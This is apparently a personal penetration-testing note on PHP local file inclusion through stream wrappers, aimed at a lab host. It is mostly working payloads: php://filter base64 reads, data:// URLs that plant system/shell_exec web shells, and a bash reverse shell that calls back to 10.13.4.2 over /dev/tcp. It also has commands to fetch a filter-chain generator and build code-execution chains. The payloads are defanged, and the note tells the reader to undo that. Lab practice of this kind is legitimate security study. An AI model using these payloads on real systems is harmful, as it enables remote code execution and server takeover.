> [!NOTE] Windows Defender Antivirus (AV) triggers on `.md` (Markdown) files, often flagging them as potential threats. As a result, the commands provided below have been defanged to avoid false positives. Kindly remove the `p_h_p` before executing them.

Base64 encode LFI (Gets around filters sometimes)

> [!NOTE]
> ```
> http://10.10.99.193/lab1.p_h_p?file=p_h_p://filter/convert.base64-encode/resource=welcome.p_h_p
> http://10.10.99.193/lab1.p_h_p?file=p_h_p://filter/convert.base64-encode/resource=welcome.p_h_p%00
> ```

POC print text:
```
http://10.10.99.193/lab1.p_h_p?file=data:text/plain,helloss
```

Command Injection:
10.10.99.193/lab1.p_h_p?file=data:text/plain,<?p_h_p echo s_hell_exec('dir')?>

Web shell: 
10.10.99.193/lab1.p_h_p?file=data:text/plain,<?p_h_p system($_REQUEST['cmd']); ?>&cmd=id
10.10.99.193/lab1.p_h_p?file=data:text/plain,<?p_h_p echo shell_exec($_REQUEST['cmd']); ?>&cmd=id

From here, use the bash reverse shell script after cmd= (Make sure to catch the request in burp, and URL DECODE ONLY THE PAYLOAD AFTER CMD= FULLT, and then URL ENCODE AGAIN only once. If not, it will likely not work.)

> [!NOTE]
> ```
> GET /lab1.p_h_p?file=data:text/plain,%3C?p_h_p%20echo%20shell_exec($_REQUEST[%27cmd%27]);%20?%3E&cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/10.13.4.2/443+<%261'
> ```

---

This is Superior:

wget <https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py>

python3 php_filter_chain_generator.py --chain '<?p_h_p shell_exec($_REQUEST['0']);?>'

python3 php_filter_chain_generator.py --chain '<?p_h_p system($_REQUEST['0']);?>'

python3 php_filter_chain_generator.py --chain '<?p_h_p echo shell_exec($_GET['0']);?>'

python3 php_filter_chain_generator.py --chain '<?p_h_p echo shell_exec($_REQUEST['0']);?>'

![[docs/Attachments/Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/LFI_RFi/Wrappers/Wrappers/{{notename}}-202605011506.png]]
![[docs/Attachments/Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/LFI_RFi/Wrappers/Wrappers/{{notename}}-202605011506-1.png]]
![[docs/Attachments/Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/LFI_RFi/Wrappers/Wrappers/{{notename}}-202605011506-2.png]]